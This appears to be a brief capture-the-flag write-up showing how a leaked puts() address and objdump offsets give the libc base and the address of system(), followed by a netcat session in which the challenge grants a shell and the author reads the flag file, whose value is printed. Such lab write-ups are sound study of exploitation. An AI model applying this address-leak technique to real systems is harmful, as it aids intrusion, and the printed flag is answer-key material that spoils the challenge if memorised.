This challenge 


```shell
$ objdump -d libc6.so | grep puts
.
.
.
00000000000809d0 <_IO_puts@@GLIBC_2.2.5>:
   809fb:       75 63                   jne    80a60 <_IO_puts@@GLIBC_2.2.5+0x90>
   80a11:       0f 84 09 01 00 00       je     80b20 <_IO_puts@@GLIBC_2.2.5+0x150>
.
.
.
```


```shell
$ objdump -d libc6.so | grep system
000000000004fa60 <__libc_system@@GLIBC_PRIVATE>:
   4fa67:       74 07                   je     4fa70 <__libc_system@@GLIBC_PRIVATE+0x10>
   4fabb:       0f 84 7f 03 00 00       je     4fe40 <__libc_system@@GLIBC_PRIVATE+0x3e0>
.
.
.
```



```text
$ nc 20.240.63.48 30008
The libc base is randomized every time you run me. What's the correct base in this run?

puts() is located at: 0x7f6049b579d0

> 0x7f6049ad7000
Correct! Base @ libc is: 7f6049ad7000

Now that you know the libc base, calculate the memory address of system() in this run.
> 0x7f6049b26a60
Correct! system @ libc is: 0x7f6049b26a60. With this knowledge, you could call system to spawn a shell!
But since you worked so hard I will give it you :)

ls
flag.txt
leak_me
ynetd
cat flag.txt
KCSC{l34ky_l34ky_v3ry_sn34ky}
```